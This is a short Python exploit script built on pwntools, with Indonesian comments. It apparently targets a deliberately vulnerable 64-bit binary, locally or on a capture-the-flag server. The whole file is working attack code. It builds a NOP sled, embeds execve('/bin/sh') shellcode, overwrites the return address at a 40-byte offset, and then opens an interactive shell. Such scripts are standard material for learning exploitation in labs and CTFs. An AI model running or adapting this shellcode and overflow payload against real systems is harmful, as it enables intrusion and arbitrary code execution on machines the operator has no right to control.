from pwn import *

# === KONFIGURASI ===
context.arch = 'amd64' # Sangat penting set ke 64-bit
exe = './vulnerable_64'
elf = ELF(exe)

# Ganti ke 'remote' jika menembak server NC
mode = 'local' 

if mode == 'local':
    p = process(exe)
else:
    p = remote('target.ctf.id', 12345)

# === DATA EXPLOIT x64 ===
# Perkiraan alamat buffer di stack x64 (hasil p $rsp di GDB)
# Contoh: 0x7fffffffe4a0. Kita incar tengah NOP sled.
target_addr = 0x7fffffffe4d0 

# Shellcode x64 execve("/bin/sh") - 24-27 byte
shellcode = b"\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x48\x31\xc0\xb0\x3b\x0f\x05"

# Berdasarkan gambar dac6e8, offset x64 ke return address adalah 40 byte
# (32 byte buffer + 8 byte Saved RBP)
offset_to_ret = 40 
nop_size = offset_to_ret - len(shellcode)

# === SUSUN PAYLOAD ===
# Struktur: [NOP Sled] + [Shellcode] + [Return Address 8-byte]
payload = b"\x90" * nop_size
payload += shellcode
payload += p64(target_addr) # p64 untuk alamat 8-byte x64

# === EKSEKUSI ===
log.info(f"Mengirim payload x64 (Total: {len(payload)} byte)...")
p.sendline(payload)
p.interactive()